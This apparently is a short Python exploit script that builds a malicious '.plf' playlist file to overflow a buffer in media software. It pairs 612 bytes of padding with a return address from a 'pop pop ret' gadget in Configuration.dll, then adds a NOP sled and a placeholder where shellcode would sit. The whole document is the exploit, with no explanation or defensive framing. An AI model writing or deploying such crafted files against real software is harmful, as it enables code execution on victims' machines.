#0x6034023c : pop edi # pop ebx # ret 0x04 |  [Configuration.dll]
buffer = "A"*612 + "\x3c\x02\x34\x60" + "\x90"*20 + "X"*250
f = open('4.plf','w')
f.write(buffer)
f.close()
